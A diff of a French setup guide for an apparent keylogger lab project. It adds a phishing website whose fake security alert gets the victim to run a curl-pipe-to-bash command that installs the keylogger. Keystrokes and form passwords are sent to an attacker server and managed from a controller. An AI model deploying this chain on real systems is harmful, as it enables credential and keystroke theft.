@@ -33,30 +33,30 @@ Ce guide décrit la mise en place complète du projet conformément au sujet «�
    ```
    La console doit afficher l’écoute HTTP/TCP. Laisser ce terminal ouvert.
 
-## 4. Installer la VM Victime
+## 4. Installer la VM Victime - Scénario de phishing
 
-1. Copier le dossier `victime/` sur la VM.  
-2. Installer les dépendances :
+1. Copier le dossier `KeyloggerScenario/` sur la VM.  
+2. Installer Node.js (si nécessaire) :
    ```
-   cd victime
-   pip install -r requirements.txt
-   sudo apt install python3-dev libx11-dev   # si besoin (Linux)
+   curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+   sudo apt install -y nodejs
    ```
-3. Adapter `config.py` :
+3. Installer les dépendances du site web :
    ```
-   ATTACKER_IP = "<IP de la VM Attaquant>"
-   ATTACKER_PORT = 8080
-   EXFILTRATION_MODE = "http"   # ou "tcp"
+   cd KeyloggerScenario
+   npm install
    ```
-4. Vérifier la connectivité :
+4. Configurer l'IP du serveur attaquant dans `server/routes.ts` et `server/storage.ts` :
+   - Remplacer `192.168.56.101` par l'IP réelle de la VM Attaquant
+5. Démarrer le site web :
    ```
-   curl http://<IP_attaquant>:8080/victims
+   npm run dev
    ```
-5. Démarrer le keylogger :
-   ```
-   python keylogger.py
-   ```
-   Le programme affiche l’UUID généré et le mode d’exfiltration actif.
+   Le site est accessible sur `http://localhost:5000`
+6. Ouvrir le site dans un navigateur et suivre les instructions :
+   - Copier la commande affichée dans l'alerte de sécurité
+   - L'exécuter dans un terminal : `curl http://localhost:5000/install.sh | bash`
+   - Le keylogger s'installe automatiquement dans `~/.espoir-solidaire/` avec un environnement virtuel Python isolé
 
 ## 5. Installer le contrôleur
 
@@ -73,12 +73,14 @@ Ce guide décrit la mise en place complète du projet conformément au sujet «�
    ```
 5. Tableau de bord web : accessible sur `http://<IP_attaquant>:8080`.
 
-## 6. Ordre d’exécution conseillé
+## 6. Ordre d'exécution conseillé
 
 1. Serveur attaquant (`python server.py`).  
-2. Keylogger sur la victime (`python keylogger.py`).  
-3. Contrôleur CLI ou ouverture du tableau de bord web.  
-4. Vérifier côté serveur que les logs sont reçus (`[+] N logs reçus de <uuid>`).
+2. Site web de phishing sur la victime (`npm run dev` dans KeyloggerScenario).  
+3. Victime visite le site et exécute la commande d'installation du keylogger.  
+4. Contrôleur CLI ou ouverture du tableau de bord web.  
+5. Victime remplit le formulaire d'enquête.  
+6. Vérifier côté serveur que les logs et les données du formulaire sont reçus.
 
 ## 7. Utiliser le contrôleur
 
@@ -88,6 +90,7 @@ Ce guide décrit la mise en place complète du projet conformément au sujet «�
 list                           # lister les victimes
 logs <victim_id> [limit]       # afficher les logs
 analyze <victim_id>            # analyser les frappes
+surveys                        # afficher les données des formulaires capturés
 start <victim_id>              # start_capture
 stop <victim_id>               # stop_capture
 flush <victim_id>              # flush_logs
@@ -100,7 +103,8 @@ command <victim_id> <cmd> ...  # format générique
 1. Sélectionner une victime dans la liste.  
 2. Les logs sont rafraîchis toutes les 3 s.  
 3. Boutons disponibles : Start Capture, Stop Capture, Flush Logs, Switch HTTP/TCP.  
-4. Section Analyse pour consulter les statistiques simples (total de touches, mots-clés, séquences répétitives).
+4. Section Analyse pour consulter les statistiques simples (total de touches, mots-clés, séquences répétitives).  
+5. Section Formulaires pour afficher les données capturées du formulaire de phishing (nom, email, mot de passe, etc.).
 
 ## 8. Dépannage
 
